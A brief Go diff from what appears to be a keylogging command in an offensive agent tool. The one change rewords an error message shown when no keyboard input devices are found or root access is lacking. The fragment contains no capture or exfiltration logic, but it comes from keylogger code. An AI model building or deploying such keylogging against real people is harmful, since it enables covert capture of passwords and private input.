@@ -101,7 +101,7 @@ func keylogStart() structs.CommandResult {
 		kl.running = false
 		kl.mu.Unlock()
 		if err != nil {
-			return errorf("Error finding keyboard devices: %v", err)
+			return errorf("finding keyboard devices: %v", err)
 		}
 		return errorResult("No keyboard input devices found. Need root or input group membership.")
 	}
